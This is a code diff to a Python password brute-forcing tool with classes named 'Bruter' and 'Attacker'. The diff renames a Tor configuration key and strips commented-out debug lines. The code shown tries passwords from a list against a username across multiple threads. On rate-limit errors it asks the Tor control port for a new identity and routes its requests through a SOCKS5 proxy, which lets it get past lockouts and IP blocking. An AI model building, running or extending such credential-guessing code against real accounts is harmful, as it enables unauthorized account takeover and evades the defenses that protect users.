@@ -32,14 +32,11 @@ class Bruter(threading.Thread):
         self.__on_success = on_success_callback # on_success(found, password)
         self.__on_error = on_error_callback # on_error(error_code)
 
-        # self.__queue = password_queue
         self.__username = username
         self.__running = True
-        # self.__notifier = notifier
         
-        # parse config (if you want to add any config, do it here):
-        self.__use_tor = False if config['use_tor'] == '0' else True
-        if self.__use_tor:
+        self.__usetor = False if config['usetor'] == '0' else True
+        if self.__usetor:
             self.__tor_hostname = config['torhostname']
             self.__tor_control_port = int(config['torcontrolport'])
             self.__tor_control_port_password = config['torcontrolportpassword']
@@ -60,17 +57,7 @@ class Bruter(threading.Thread):
         connection = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
         connection.connect((self.__tor_hostname, self.__tor_control_port))
         connection.send(('AUTHENTICATE "%s"\n' % self.__tor_control_port_password).encode())
-        # result = connection.recv(3).decode('ascii')
-        # print('Getting new tor identity')
-        # print(result)
-        # if result != '250':
-        #     # encountered error, cancel for now
-        #     connection.close()
-        #     sleep(1)
-        #     return
         connection.send(b'signal NEWNYM\n')
-        # print(connection.recv(3).decode('ascii'))
-        # print('requested new tor identity')
         connection.close()
         sleep(10)
 
@@ -78,7 +65,7 @@ class Bruter(threading.Thread):
         
         # initialize proxy:
         proxy = None
-        if self.__use_tor:
+        if self.__usetor:
             proxy = {
                 'http' : 'socks5://%s:%s' % (self.__tor_hostname, self.__tor_socks_port),
                 'https' : 'socks5://%s:%s' % (self.__tor_hostname, self.__tor_socks_port)
@@ -147,7 +134,7 @@ class Bruter(threading.Thread):
                 # Should change ip
                 # self.__notifier.notify(msg = 'Too many requests. Requesting new Tor identity...')
                 self.__on_error(Bruter.ERR_TOO_MANY_REQUESTS)
-                if self.__use_tor:
+                if self.__usetor:
                     self.get_new_tor_identity()
                 continue
 
@@ -248,7 +235,7 @@ class Attacker():
                     'passlist' : self.__passlist,
                     'thread_count' : self.__thread_count,
                     'total_scanned' : self.__total_scanned,
-                    'use_tor' : self.__config['use_tor'],
+                    'usetor' : self.__config['usetor'],
                     'torhostname' : self.__config['torhostname'],
                     'torsocksport' : self.__config['torsocksport'],
                     'torcontrolport' : self.__config['torcontrolport'],
